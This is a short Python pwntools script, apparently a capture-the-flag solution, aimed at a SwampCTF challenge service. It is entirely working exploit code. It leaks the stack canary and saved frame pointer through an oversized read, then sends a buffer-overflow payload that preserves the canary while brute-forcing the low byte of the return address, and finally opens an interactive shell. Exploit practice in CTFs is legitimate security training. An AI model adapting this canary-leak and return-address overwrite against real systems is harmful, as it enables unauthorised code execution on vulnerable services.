from pwn import *

byt = 0x00

while (byt != 0xff):

	print(byt)

	p = remote('chals.swampctf.com', 40005)

	print(p.recvuntil(b'>').decode())

	p.sendline(b'2')

	print(p.recvuntil(b'username').decode())

	stack_args_to_read = 100

	p.sendline(f'{8 * stack_args_to_read}'.encode())
	p.sendline(b'1234567890123456')

	d = p.recvuntil(b'1234567890123456', timeout=2)

	if (d == b''):
		continue

	data = p.recvuntil(b'===================')[:-19]

	unpacked = unpack_many(data, 64, endian='little', sign=False)

	canary = unpacked[1]
	old_ebp = unpacked[2]

	print([hex(i) for i in unpacked])

	print('[+] Canary is', hex(canary))

	print(p.recvuntil(b'>').decode())

	p.sendline(b'1')

	print(p.recvuntil(b'Username: ').decode())

	payload  = b'A' * 16
	payload += b'B' * 8
	payload += p64(canary)
	payload += p64(old_ebp)
	payload += str(byt).encode() + b'\x14'

	p.send(payload)

	print(p.recvuntil(b'Password: ').decode())

	p.send(payload)

	print(p.recvuntil(b'now!\n').decode())

	p.interactive()

	p.close()

	byt += 1
